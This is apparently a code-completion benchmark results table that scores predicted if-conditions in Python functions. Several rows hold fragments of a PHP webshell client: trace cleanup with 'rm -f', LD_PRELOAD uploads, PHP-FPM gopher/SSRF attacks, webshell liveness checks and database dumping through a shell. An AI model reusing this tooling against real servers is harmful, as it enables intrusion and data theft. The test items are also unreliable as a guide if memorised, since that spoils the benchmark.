input_function,expected_condition,predicted_condition,exact_match,bleu_score
"def exec_model(imports_code, model_code, distributed): """"""Runs the ML code and returns the generated model Args: imports_code (str): Imports before the code model_code (str): ML code to run Returns: model: generated model from the code """""" if: 'Checks if there is any import to be executed before the code' exec(imports_code, None, globals()) if distributed: ml_code = format_ml_code(model_code) exec(ml_code, None, globals()) 'Runs the ML code' else: exec(model_code, None, globals()) return model",imports_code is not None and imports_code != '',imports_code,0.0,0.0
"def __getitem__(self, idx): res_tuple = self.data[idx] res_data, res_label = (res_tuple[0], res_tuple[1]) if: res_data = self.transform(res_tuple[0]) if self.label_transform: res_label = self.label_transform(res_tuple[1]) return (res_data, res_label)",self.transform,self.transform,1.0,0.0
"def calculate_reward(self, rounds, control_msg, clients_contributions): """"""Calculate reward given to the user in that round"""""" BASE_REWARD = 100 current_metrics = control_msg['metrics'] if: previous_loss = float('inf') current_loss = current_metrics['training']['loss'][-1] else: previous_metrics = json.loads(self.contract.functions.getMetricsByRound(rounds).call()) if current_metrics['validation'].get('loss')[-1] is not None and previous_metrics['validation'].get('loss')[-1] is not None: try: previous_loss = previous_metrics['validation']['loss'][-1] current_loss = current_metrics['validation']['loss'][-1] except KeyError: previous_loss = previous_metrics['training']['loss'][-1] current_loss = current_metrics['training']['loss'][-1] else: current_loss = current_metrics['training']['loss'][-1] previous_loss = previous_metrics['training']['loss'][-1] reward = 0 if 0 <= current_loss / previous_loss <= 0.5: reward = 1 elif 0.75 < current_loss / previous_loss <= 1: reward = 0.5 elif 1 < current_loss / previous_loss <= 1.5: reward = 1 / 3 else: reward = 0 data_size = 0 for user in clients_contributions: data_size += clients_contributions[user] reward = reward * BASE_REWARD * control_msg['num_data'] / data_size logging.info('Calculated reward [%s] for user [%s] with data size [%s] at round [%s]', reward, control_msg['account'], control_msg['num_data'], rounds) nonce = self.web3_connection.eth.getTransactionCount(self.eth_wallet_address) tx_hash = self.contract.functions.setTokens(control_msg['topic'], Web3.toWei(int(reward), 'ether')).transact({'from': self.eth_wallet_address, 'nonce': nonce}) logging.info('Set tokens into blockchain with reward [%s], tx_hash [%s]', reward, tx_hash.hex())",rounds < 1,rounds is None,0.0,0.0
"def CloudBasedTraining(training): training.get_models() 'Downloads the models from the URLs received, saves and loads them from the filesystem to Tensorflow models' consumer = KafkaConsumer(training.control_topic, bootstrap_servers=training.bootstrap_servers, auto_offset_reset='earliest', enable_auto_commit=False) 'Starts a Kafka consumer to receive the datasource information from the control topic' logging.info('Created and connected Kafka consumer for control topic') datasource_received = False while datasource_received is False: 'Loop until a datasource is received' msg = next(consumer) 'Gets a new message from Kafka control topic' logging.info('Message received in control topic') logging.info(msg) try: ok_training = False data = None if: received_deployment_id = int.from_bytes(msg.key, byteorder='big') if received_deployment_id == training.deployment_id: 'Whether the deployment ID received matches the received in this task, then it is a datasource for this task.' data = json.loads(msg.value) ""Data received from Kafka control topic. Data is a JSON with this format:\n dic={\n 'topic': ..,\n 'input_format': ..,\n 'input_config' : ..,\n 'description': ..,\n 'validation_rate' : ..,\n 'total_msg': ..\n }\n "" kafka_topic = data['topic'] logging.info('Received control confirmation of data from Kafka for deployment ID %s. Ready to receive data from topic %s with batch %d', training.deployment_id, str(kafka_topic), training.batch) if training.unsupervised: if data['unsupervised_topic'] is not None: unsupervised = True unsupervised_kafka_topic = data['unsupervised_topic'] logging.info('Also received unsupervised topic %s for unlabeled data', str(unsupervised_kafka_topic)) else: unsupervised = False logging.info('User deployed semi-supervised training but no unsupervised topic was received for unlabeled data. Performing standard supervised training with labeled data.') else: unsupervised = False logging.info('User deployed supervised training with labeled data.') decoder = DecoderFactory.get_decoder(data['input_format'], data['input_config",msg.key is not None,msg is not None,0.0,38.75385825373298
"def __init__(self): """"""Loads the environment information"""""" self.bootstrap_servers = os.environ.get('BOOTSTRAP_SERVERS') self.result_url = os.environ.get('RESULT_URL') self.result_id = os.environ.get('RESULT_ID') self.control_topic = os.environ.get('CONTROL_TOPIC') self.deployment_id = int(os.environ.get('DEPLOYMENT_ID')) self.batch = int(os.environ.get('BATCH')) self.kwargs_fit = json.loads(os.environ.get('KWARGS_FIT').replace(""'"", '""')) self.kwargs_val = json.loads(os.environ.get('KWARGS_VAL').replace(""'"", '""')) self.confussion_matrix = json.loads(os.environ.get('CONF_MAT_CONFIG').replace(""'"", '""')) self.model = None self.tensorflow_models = None self.unsupervised = eval(os.environ.get('UNSUPERVISED')) if: self.unsupervised_rounds = int(os.environ.get('UNSUPERVISED_ROUNDS')) self.confidence = eval(os.environ.get('CONFIDENCE')) logging.info('Received main environment information (bootstrap_servers, result_url, result_id, control_topic, deployment_id, batch, kwargs_fit, kwargs_val, unsupervised_training) ([%s], [%s], [%s], [%s], [%d], [%d], [%s], [%s], [%s])', self.bootstrap_servers, str(self.result_url), str(self.result_id), self.control_topic, self.deployment_id, self.batch, str(self.kwargs_fit), str(self.kwargs_val), str(self.unsupervised))",self.unsupervised,'UNSUPERVISED_ROUNDS' in os.environ,0.0,6.567274736060395
"def split_online_dataset(self, validation_rate, kafka_dataset): """"""Splits the online dataset for training and validation"""""" training_size = int((1 - validation_rate) * len(kafka_dataset)) validation_size = int(validation_rate * len(kafka_dataset)) logging.info('Training batch size %d and validation batch size %d', training_size, validation_size) train_dataset = kafka_dataset.take(training_size) 'Splits dataset for training' if: validation_dataset = kafka_dataset.skip(training_size) else: 'If no validation is greater than 0, then split the dataset for training' validation_dataset = None splits = {'train_dataset': train_dataset, 'validation_dataset': validation_dataset} return splits",validation_size > 0,validation_size > 0,1.0,100.00000000000004
"def train_classic_semi_supervised_model(self, splits, unsupervised_kafka_dataset, callback): """"""Trains semi-supervised model"""""" x_train = np.concatenate([x for x, y in splits['train_dataset']], axis=0) y_train = np.concatenate([y for x, y in splits['train_dataset']], axis=0) x_val = np.concatenate([x for x, y in splits['validation_dataset']], axis=0) y_val = np.concatenate([y for x, y in splits['validation_dataset']], axis=0) logging.info('Training model with labeled data') if: model_trained = self.model.fit(x=x_train, y=y_train, validation_data=(x_val, y_val), **self.kwargs_fit, callbacks=[callback]) else: y_training = [] y_validation = [] for i in range(self.N): y_training.append(y_train) y_validation.append(y_val) model_trained = self.model.fit(x=x_train, y=y_training, validation_data=(x_val, y_validation), **self.kwargs_fit, callbacks=[callback]) unsupervised_kafka_dataset = unsupervised_kafka_dataset.batch(self.batch) x_unlabeled = np.concatenate([x for x, y in unsupervised_kafka_dataset], axis=0) for round in range(self.unsupervised_rounds): if len(x_unlabeled) > 0: predictions = self.model.predict(x_unlabeled) if: confidence_scores = np.max(predictions, axis=1) pseudo_labels = np.argmax(predictions, axis=1) else: confidence_scores = np.max(predictions[-1], axis=1) pseudo_labels = np.argmax(predictions[-1], axis=1) high_confidence_indices = confidence_scores >= self.confidence high_confidence_pseudo_labels = pseudo_labels[high_confidence_indices] high_confidence_unlabeled_data = x_unlabeled[high_confidence_indices] if len(high_confidence_pseudo_labels","not hasattr(self, 'N')",round == 0,0.0,0.0
"def sendDistributedTempMetrics(self, train_metrics, val_metrics): """"""Send the metrics to the backend"""""" results_list = [] for i in range(len(self.tensorflow_models)): results = {'train_metrics': train_metrics[i], 'val_metrics': val_metrics[i]} results_list.append(results) new_urls = [] for url in self.result_url: new_urls.append(url.replace('results', 'results_metrics')) retry = 0 finished = False while not finished and retry < RETRIES: try: responses = [] for result, url in zip(results_list, new_urls): data = {'data': json.dumps(result)} logging.info('Sending result data to backend') r = requests.post(url, data=data) responses.append(r.status_code) if: finished = True logging.info('Metrics updated!') else: time.sleep(SLEEP_BETWEEN_REQUESTS) retry += 1 except Exception as e: traceback.print_exc() retry += 1 logging.error('Error sending the metrics to the backend [%s].', str(e)) time.sleep(SLEEP_BETWEEN_REQUESTS)",responses[0] == 200 and len(set(responses)) == 1,responses[0] == 200 and len(responses) == 1,0.0,70.95461077803648
"def sendDistributedMetrics(self, epoch_training_metrics, epoch_validation_metrics, test_metrics, dtime): """"""Sends distributed metrics to backend"""""" retry = 0 finished = False datasource_received = False start_sending_results = time.time() while not finished and retry < RETRIES: try: TRAINED_MODEL_PATHS = [] for i in range(1, len(self.tensorflow_models) + 1): path = 'trained_model_{}.h5'.format(i) TRAINED_MODEL_PATHS.append(path) for m, p in zip(self.tensorflow_models, TRAINED_MODEL_PATHS): m.save(p) 'Saves the trained models in the filesystem' files = [] for p in TRAINED_MODEL_PATHS: files_dic = {'trained_model': open(p, 'rb'), 'confussion_matrix': None} files.append(files_dic) if: indefinite = True else: indefinite = False results_list = [] for i in range(len(self.tensorflow_models)): results = {'train_metrics': epoch_training_metrics[i], 'val_metrics': epoch_validation_metrics[i], 'test_metrics': test_metrics[i] if test_metrics != [] else [], 'training_time': round(dtime, 4), 'confusion_matrix': None, 'indefinite': indefinite} results_list.append(results) responses = [] for result, url, f in zip(results_list, self.result_url, files): data = {'data': json.dumps(result)} logging.info('Sending result data to backend') r = requests.post(url, files=f, data=data) responses.append(r.status_code) 'Sends the training results to the backend' if responses[0] == 200 and len(set(responses)) == 1: finished = True datasource_received = True logging.info('Results data sent correctly to backend!!') else: time.sleep(SLEEP_BETWEEN_REQUESTS) retry += 1 except Exception as e: traceback.print_exc() retry += 1 logging.error('Error sending the result to the backend [%s].', str(e)) time.sleep(SLEEP",self.stream_timeout == -1,epoch_training_metrics[0] == epoch_validation_metrics[0],0.0,4.753622060013117
"def call_all(self, func_name: str, args: tuple): if: return None response_dict = {} for x in self.names(): try: func = getattr(self.get(x), func_name) response_dict[x] = func(*args) except Exception: continue return response_dict","not isinstance(args, tuple)",len(args) == 0,0.0,14.535768424205482
"def get_message(self, pluginName): if: return self.__message_dict[pluginName] return ''",pluginName in self.__message_dict,pluginName in self.__message_dict,1.0,100.00000000000004
"@alias(True, func_alias='?', o='order') def run(order: str=''): """""" help Output the help document for the command or all help menu. eg: help {order} """""" if: set_namespace(gget('namespace'), True, False) return tpf = None gpf = gget(f'general.pf') npf = gget(f""{gget('namespace')}.pf"") cpf = gget(f'custom.pf') order = order_alias(order) if order in npf: tpf = npf elif order in gpf: tpf = gpf elif order in cpf: tpf = cpf elif order: print('%s object is not command-function' % order) return api = gget('api') func = getattr(tpf[order], api) if func.__doc__: print(func.__doc__) block = ' ' * 4 block_two = block * 2 sig = inspect.signature(func) folders_namespace = gget('folders_namespace') func_folder, func_name = func.__module__.split('.') func_reverse_alias = gget('%s.reverse_alias' % func_name, folders_namespace[func_folder]) if len(sig.parameters): print('%sCommand Args:' % block) for k, v in sig.parameters.items(): arg = '--%s' % k if k in func_reverse_alias: arg = '-%s,%s' % (func_reverse_alias[k], arg) desc = str(v).split(':') if len(desc) > 1: desc = desc[1].split('=') if len(desc) > 1: desc = '[%s] %s (Default: %s)' % (desc[0].strip(), k, desc[1].strip()) else: desc = '[%s] %s' % (desc[0].strip(), k) arg = '%s(*)' % arg else: desc = '[?] %s' % desc[0] arg = '%s(?)' % arg print('%s%-25s%s%s\n' % (block_two, arg, block_two, desc))",order == '',order == 'namespace',0.0,59.460355750136046
"@alias(True) def run(filepath='log.txt'): """""" log (Only for *unix) Write input and output to the log. eg: log {filepath=""log.txt""} """""" if: print(color.red(""\nYour system isn't *unix\n"")) return filepath = path.abspath(filepath) dirpath = path.dirname(filepath) if not path.exists(dirpath): print(color.red('\nFile path is invalid\n')) return if access(dirpath, W_OK): print(color.green(f'\nSet log in {filepath}\n')) sys.stdout = Logger(filepath, sys.__stdout__) sys.stderr = Logger(filepath, sys.__stderr__) gset('log_filepath', filepath, True) gset('log_stdout', sys.stdout, True) gset('log_stderr', sys.stderr, True) else: print(color.red('\nFile path is invalid\n'))",is_windows(False),not is_windows(),0.0,53.7284965911771
"def size_to_human(num, suffix='B'): for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']: if: return '%3.1f %s%s' % (num, unit, suffix) num /= 1024.0 return '%.1f%s%s' % (num, 'Yi', suffix)",abs(num) < 1024.0,abs(num) < 1024.0,1.0,100.00000000000004
"def human_to_size(size): size = size.upper() if: size = sub('([KMGT]?B)', ' \\1', size) number, unit = [string.strip() for string in size.split()] return int(float(number) * UNITS[unit])","not match(' ', size)","isinstance(size, str)",0.0,8.22487964923291
"def clean_trace(): def get_clean_php(filename: str): system_clean_command = f'rm -f {filename} && echo success' return '$f=base64_decode(""%s"");\n if (!unlink($f)){\n %s\n }else{echo ""success"";}\n ' % (base64_encode(filename), get_system_code(system_clean_command)) ld_preload_filename = gget('webshell.ld_preload_path', 'webshell', None) udf_filename = gget('webshell.udf_path', 'webshell', None) iconv_filename = gget('webshell.iconv_path', 'webshell', None) iconv_gconv_modules_filename = gget('webshell.iconv_gconv_modules_path', 'webshell', None) clean_files = (ld_preload_filename, udf_filename, iconv_filename, iconv_gconv_modules_filename) for each in clean_files: if each: print(color.yellow('\nClean %s ...\n' % each)) res = send(get_clean_php(each)) if res: text = res.r_text.strip() if 'success' in text: print(color.green('Clean success\n')) else: print(color.red('Clean failed\n')) if: print(color.yellow('\nClean udf ...\n')) execute_sql_command(""delete from mysql.func where name='sys_eval';"") gset('webshell.ld_preload_path', None, True, 'webshell') gset('webshell.ld_preload_func', None, True, 'webshell') gset('webshell.iconv_path', None, True, 'webshell') gset('webshell.iconv_gconv_modules_path', None, True, 'webshell') gset('webshell.udf_path', None, True, 'webshell') gset('webshell.apache_mod_cgi', False, True, 'webshell') gset('db_dbms', '', True, 'webshell') gset('db_ext', '', True, 'webshell') gset('db_connect_type', '', True, 'webshell') g",udf_filename,udf_filename,1.0,0.0
"def fake_referer(): i = randint(1, 6) random_params = '' for _ in range(randint(4, 8)): random_params += f'{trush()}={trush()}&' random_params = random_params.strip('&') if: return f'https://www.google.{trush(2, 2)}/url?{random_params}' elif i == 2: return f'https://blog.csdn.net/{trush(5, 12)}/article/details/{randint(10000, 99999)}?{random_params}' elif i == 3: return f'https://www.baidu.com/?q={trush(2, 10)}&{random_params}' elif i == 4: return f'https://www.google.com/?q={trush(2, 10)}&{random_params}' elif i == 5: return f'https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}' elif i == 6: return f'https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}'",i == 1,i == 1,1.0,100.00000000000004
"def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict): attack_type = gget('webshell.bdf_fpm.type', 'webshell') host = gget('webshell.bdf_fpm.host', 'webshell') port = gget('webshell.bdf_fpm.port', 'webshell') sock_path = gget('webshell.bdf_fpm.sock_path', 'webshell') php_file_path = gget('webshell.bdf_fpm.php_file_path', 'webshell') if: phpcode = get_php_fpm_eval(attack_type) % generate_ssrf_code_payload(host, port, phpcode, php_file_path) elif attack_type == 'sock': phpcode = get_php_fpm_eval(attack_type) % (sock_path, generate_base64_socks_code_payload(host, port, phpcode, php_file_path)) elif attack_type == 'http_sock': phpcode = get_php_fpm_eval(attack_type) % (host, port, generate_base64_socks_code_payload(host, port, phpcode, php_file_path)) elif attack_type == 'ftp': php_server_port = gget('webshell.bdf_fpm.php_server_port', 'webshell', False) random_ftp_port = randint(60000, 64000) if not php_server_port: random_php_server_port = random_ftp_port + randint(1, 1000) php_server_phpcode = get_system_code('php -n -t /tmp -S 0.0.0.0:%s' % random_php_server_port, False) params_dict[raw_key][password] = php_server_phpcode t = Thread(target=send, kwargs={'phpcode': php_server_phpcode, '_in_system_command': True}) t.setDaemon(True) t.start() gset('webshell.bdf_fpm.php_server_port', random_php_server_port, True, 'webshell') php",attack_type == 'gopher',attack_type == 'ssrf',0.0,75.98356856515926
"@alias(True) def run(timeout: float=2.0): """""" check Check if each webshell is alive. eg: check {timeout=2.0} """""" root_path = gget('root_path') log_path = path.join(root_path, 'webshell.log') if: print(color.red('No webshell.Log')) return 0 with open(log_path, 'r') as f: lines = f.readlines() for index, line in enumerate(lines, 1): data = line.strip().split('|') if len(data) < 3: continue url, method, pwd, *encode_functions = data if method == 'GET': raw_key = 'params' elif method == 'POST': raw_key = 'data' elif method == 'COOKIE': raw_key = 'cookies' elif method == 'HEADER': raw_key = 'headers' else: print(f""[{color.blue(str(index))}] {color.red('Method error')}"") continue check_value = randint(0, int(urandom(8).hex(), 16)) correct_value = md5(str(check_value).encode()).hexdigest() check_command = f""print(md5('{check_value}'));"" encode_pf = gget('encode.pf') for func in encode_functions: if func in encode_pf: check_command = encode_pf[func].run(check_command) params_dict = {raw_key: {pwd: check_command}, 'timeout': timeout} common_text, status_code_text = ('', '000') try: res = post(url, verify=False, **params_dict) status_code_text = str(res.status_code) if correct_value in res.text: common_text = color.green('Alive') else: common_text = color.red('Not Alive') except exceptions.Timeout: common_text = color.yellow('Timeout') except exceptions.RequestException: common_text = color.red('Request error') print(f'[{color.blue(str(index))}] [{color.yellow(status_code_text)}] {common_text} {url}')",not exists(log_path),not path.exists(log_path),0.0,61.04735835807847
"@alias(True, _type='OTHER', func_alias='ag', u='url', m='method', d='data', p='params', c='cookie', t='type', to='timeout', re_m='redirect_method') def run(url: str, method: str, data: str='', params: str='', cookie: str='', type: int=1, timeout: float=3, redirect_method: str='POST', redirect_auto: int=1, redirect_cookie_use: int=1, create_dir: int=0): """""" agent Lightweight intranet browsing. eg: agent {url} {method} {data=''} {params=''} {cookie=''} {type=[socket|file_get_contents|curl]{1|2|3},default = 1} {timeout=3} {redirect_method=POST} {redirect_auto=1} {redirect_cookie_use=1} {create_dir=0} """""" php = get_php_agent(url, method.upper(), redirect_method.upper(), data, params, cookie, redirect_auto, redirect_cookie_use, timeout, type) res = send(php) if: return text = res.r_text try: current_status = findall('<CurrentStatus>(.*)</CurrentStatus>', text, I + M) assert len(current_status), ""Can't get status```"" current_status = current_status[0] current_url = findall('<CurrentUrl>(.*)</CurrentUrl>', text, I + M) current_url = base64_decode(current_url[0]) if len(current_url) else '' current_cookie = findall('<CurrentCookie>(.*)</CurrentCookie>', text, I + M) current_cookie = base64_decode(current_cookie[0]) if len(current_cookie) else '' current_header = findall('<CurrentHeader>(.*)</CurrentHeader>', text, I + M) current_header = '\n '.join((base64_decode(line) for line in current_header[0].split('|'))) if len(current_header) else '' if current_status == 'success': print(color.magenta('Current Url: ') + color.cyan(current_url) + '\n') print(color.",not res,not res,1.0,0.0
"def set_mode(mode: int, test: bool=False): if: ext = mode_require_ext_dict[mode] res = send(get_detectd_ext(ext)) if not res: return False text = res.r_text.strip() if 'exist' not in text: print(color.red(f'\nNo {ext} extension\n')) return False if mode == 4 and (not gget('webshell.ld_preload_path', 'webshell', False)): if is_windows(): print(color.red('\nNo ld_preload function!\n')) return False disable_funcs = gget('webshell.disable_functions', 'webshell') if 'putenv' in disable_funcs: print(color.red('\nputenv is disabled\n')) return False if not gget('webshell.ld_preload_path', 'webshell', None): filename = '/tmp/%s.so' % str(uuid4()) available_trigger_funcs = ['mail', 'error_log', 'mb_send_mail'] trigger_funcs = [f for f in available_trigger_funcs if f not in disable_funcs] if not trigger_funcs: print(color.red('\nNo trigger function\n')) return False trigger_func = trigger_funcs[0] bits = gget('webshell.arch', namespace='webshell') if not bits: print('\nInput target system bits (32/64): ', end='') _ = readline().strip() if _ == '32': bits = 32 elif _ == '64': bits = 64 else: print(color.red('\nUnknown bits\n')) return False bits = str(bits) if bits == '32': bits = '86' upload_result = upload(path.join(gget('root_path'), 'auxiliary', 'ld_preload', 'ld_preload_x' + bits + '.so'), filename, True) if not upload_result: print(color.red('\nUpload error\n')) return gset('webshell.ld_preload_path', filename, True, 'webshell') gset('webshell.ld_preload_func', trigger_func, True, 'webshell') elif mode == 8: if gget('db_connected', '",mode in mode_require_ext_dict,mode in mode_require_ext_dict,1.0,100.00000000000004
"@alias(True, _type='DATABASE', t='table') def run(table: str): """""" db_columns Output all columns of a table. eg: db_columns {table} """""" if: print(color.red('Please run db_init command first')) return database = gget('db_dbname', 'webshell') print(execute_sql_command(f'show columns from {table};', database))","not gget('db_connected', 'webshell')","not gget('db_connected', 'webshell')",1.0,100.00000000000004
"def get_table_name_php(database): connect_type = gget('db_connect_type', 'webshell') if: return get_php_table_name(connect_type) % get_db_connect_code(dbname=database) elif connect_type == 'mysqli': return get_php_table_name(connect_type) % get_db_connect_code(dbname=database) else: return ''",connect_type == 'pdo',connect_type == 'mysql',0.0,75.98356856515926
"def get_table_row_number(database, table): connect_type = gget('db_connect_type', 'webshell') if: php = get_php_table_row_number(connect_type) % (get_db_connect_code(dbname=database), table) elif connect_type == 'mysqli': php = get_php_table_row_number(connect_type) % (get_db_connect_code(dbname=database), table) else: php = '' res = send(php) try: return int(res.r_text.strip()) except ValueError: return -1",connect_type == 'pdo',connect_type == 'mysql',0.0,75.98356856515926
"def get_table_construct(database, table, encoding): global REQUEST_LOCK connect_type = gget('db_connect_type', 'webshell') if: php = get_php_table_construct(connect_type) % (get_db_connect_code(dbname=database), table) elif connect_type == 'mysqli': php = get_php_table_construct(connect_type) % (get_db_connect_code(dbname=database), table) else: php = '' retry_time = 5 text = None while retry_time and (not text): with REQUEST_LOCK: res = send(php) try: text = gzinflate(b64decode(res.r_text.strip())) except Exception: text = None retry_time -= 1 return text if text else ''",connect_type == 'pdo',connect_type == 'mysql',0.0,75.98356856515926
"def get_data(index, database, table, encoding, offset, blocksize): global REQUEST_LOCK connect_type = gget('db_connect_type', 'webshell') if: php = get_php_data(connect_type) % (get_db_connect_code(dbname=database), table, offset, blocksize) elif connect_type == 'mysqli': php = get_php_data(connect_type) % (get_db_connect_code(dbname=database), table, offset, blocksize) else: php = '' retry_time = 5 text = None while retry_time and (not text): with REQUEST_LOCK: res = send(php) try: text = gzinflate(b64decode(res.r_text.strip())) except Exception: text = None retry_time -= 1 return (index, text if text else '')",connect_type == 'pdo',connect_type == 'webshell',0.0,75.98356856515926
"@alias(True, func_alias='exec', _type='SHELL') def run(editor: str='', edit_args: str=''): """""" execute execute Custom PHP code by notepad / vi as default or your own editor, edit_args split by space. eg: execute {editor=""""} {edit_args=""""} execute code '""--wait""' """""" file_name = str(uuid4()) + '.php' real_file_path = newfile(file_name) open_editor(real_file_path, editor, edit_args) with open(real_file_path, 'r') as f: code = f.read() if: code = code[5:] if code.endswith('?>'): code = code[:-2] print(color.yellow('Execute php code...')) res = send(code) if not res: return text = res.r_text.strip() status_code = color.green(str(res.status_code)) if res.status_code == 200 else color.yellow(str(res.status_code)) print(f""\n{color.green('Result:')}\n[{status_code}] {color.cyan('length')}: {len(text)} \n{text}\n"") remove(real_file_path)",code.startswith('<?php'),code.startswith('<'),0.0,62.401954419369176
"@alias(True, _type='DETECT', fp='web_file_path') def run(web_file_path: str='/var'): """""" fl Search log file (access.log,error.log) from target system. eg: fl {web_file_path=""/var""} """""" php = get_php(web_file_path) try: res = send(php) if: return file_tree = res.r_json() except JSONDecodeError: print(color.red('Parse Error')) return print_tree(web_file_path, file_tree)",not res,not res,1.0,0.0
"@alias(True, _type='FILE', w='web_file_path', l='local_path', s='humansize', t='threads') def run(web_file_path: str, local_path: str='', humansize: str='1MB', threads: int=5) -> bool: """""" mdownload Download file from target system by block compression and multi threads. eg: mdownload {web_file_path} {local_path=doughnuts/target/site.com/...} {humansize=""1MB"",eg=""10MB""} {threads=5} """""" global PRINT_LOCK, DOWNLOAD_SUCCESS, BAR, BLOCKSIZE, CHUNK_NAME_DICT res = send(get_filesize_php(web_file_path)) if: return try: file_size = int(res.r_text.strip()) print(color.green(f'Get file size: {size_to_human(file_size)}')) except ValueError: print(color.red(""\nCan't get file size\n"")) return res = send(get_filemd5_php(web_file_path)) if: return file_md5 = res.r_text.strip() print(color.green(f'Get file hash: {file_md5}')) if len(file_md5) != 32: print(color.red(""\nCan't sum file md5 hash\n"")) return try: blocksize = human_to_size(humansize) except Exception: blocksize = file_size // 10 print(color.yellow(f'Parse humansize error, set it to {size_to_human(blocksize)}')) if blocksize < file_size / 1000: blocksize = file_size // 100 print(color.yellow(f'Humansize too small, set it to {size_to_human(blocksize)}')) BLOCKSIZE = blocksize if file_size: file_name = path.split(web_file_path)[1] download_path = local_path or gget('webshell.download_path', 'webshell') download_path = download_path.replace('\\', '/') if not path.isdir(download_path): makedirs(download_path) file_path = path.join(download",not res,not res,1.0,0.0
"def update(future): global BAR, UPLOAD_SUCCESS, BLOCKSIZE, ALL_TASK, LOCK result = future.result() if: if not BAR.disable: with LOCK: BAR.update(BLOCKSIZE) else: UPLOAD_SUCCESS = False BAR.close() for task in reversed(ALL_TASK): task.cancel()",result,result is None or UPLOAD_SUCCESS,0.0,6.567274736060395
"@tensorrt_converter('torch.nn.Conv1d.forward') def convert_Conv1d(ctx): module = ctx.method_args[0] input = ctx.method_args[1] input_trt = trt_(ctx.network, input) output = ctx.method_return kernel_size = (module.kernel_size[0], 1) stride = (module.stride[0], 1) padding = (module.padding[0], 0) dilation = (module.dilation[0], 1) kernel = module.weight.detach().cpu().numpy()[..., None] bias = trt.Weights(torch_dtype_to_trt(module.weight.dtype)) if: bias = module.bias.detach().cpu().numpy() input_shape_trt = ctx.network.add_shape(input_trt).get_output(0) one_trt = trt_(ctx.network, torch.tensor([1], dtype=torch.int32).to(input.device)) new_input_shape_trt = ctx.network.add_concatenation([input_shape_trt, one_trt]).get_output(0) layer = ctx.network.add_shuffle(input_trt) layer.set_input(1, new_input_shape_trt) layer = ctx.network.add_convolution(input=layer.get_output(0), num_output_maps=module.out_channels, kernel_shape=kernel_size, kernel=kernel, bias=bias) layer.stride = stride layer.padding = padding layer.dilation = dilation if module.groups is not None: layer.num_groups = module.groups conv_out_trt = layer.get_output(0) out_shape_trt = ctx.network.add_shape(conv_out_trt).get_output(0) new_out_shape_trt = ctx.network.add_slice(out_shape_trt, [0], [3], [1]).get_output(0) layer = ctx.network.add_shuffle(conv_out_trt) layer.set_input(1, new_out_shape_trt) output._trt = layer",module.bias is not None,module.bias is not None,1.0,100.00000000000004
"@tensorrt_converter('torch.nn.ConvTranspose2d.forward') def convert_ConvTranspose2d(ctx): module = ctx.method_args[0] input = ctx.method_args[1] input_trt = trt_(ctx.network, input) output = ctx.method_return kernel_size = module.kernel_size if: kernel_size = (kernel_size,) * 2 stride = module.stride if not isinstance(stride, tuple): stride = (stride,) * 2 padding = module.padding if not isinstance(padding, tuple): padding = (padding,) * 2 kernel = module.weight.detach().cpu().numpy() bias = trt.Weights(torch_dtype_to_trt(module.weight.dtype)) if module.bias is not None: bias = module.bias.detach().cpu().numpy() layer = ctx.network.add_deconvolution(input=input_trt, num_output_maps=module.out_channels, kernel_shape=kernel_size, kernel=kernel, bias=bias) layer.stride = stride layer.padding = padding if module.groups is not None: layer.num_groups = module.groups output._trt = layer.get_output(0)","not isinstance(kernel_size, tuple)","not isinstance(kernel_size, tuple)",1.0,100.00000000000004
